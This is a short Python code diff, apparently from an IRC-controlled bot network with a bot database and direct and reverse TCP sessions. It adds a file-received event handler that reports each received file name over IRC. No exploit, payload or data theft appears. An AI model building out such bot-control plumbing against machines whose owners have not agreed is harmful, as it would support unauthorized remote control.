@@ -36,11 +36,13 @@ class DisplacementHandler:
                 bot.get_tcp_session().identify(self.myContext.ircNick)
                 bot.get_tcp_session().onSendingFinished.subscribe(self.tcpSession_onSendingFinished)
                 bot.get_tcp_session().onSendingProgress.subscribe(self.tcpSession_onSendingProgress)
+                bot.get_tcp_session().onFileReceived.subscribe(self.tcpSession_onFileReceived)
             else:
                 logging.error(f"Failed to TCP connect to bot: nick: {nick}, ip: {ip} port: {port}")
 
             bot.get_reversed_tcp_session().onSendingFinished.subscribe(self.tcpSession_onSendingFinished)
             bot.get_reversed_tcp_session().onSendingProgress.subscribe(self.tcpSession_onSendingProgress)
+            bot.get_reversed_tcp_session().onFileReceived.subscribe(self.tcpSession_onFileReceived)
                                  
             self.botnetDB.add_bot(bot)
 
@@ -74,3 +76,8 @@ class DisplacementHandler:
         progress_size = kwargs.get('progress_size')
         full_size = kwargs.get('full_size')
         self.irc_connection.send_query(nickname, f"Sending {filename} to {receiver}: {progress}%, {progress_size} out of {full_size} MB, Throughput: {tput} MB/s")
+
+    
+    def tcpSession_onFileReceived(self, *args, **kwargs):
+        filename = kwargs.get('filename')
+        self.irc_connection.send_message(f"File {filename} received")
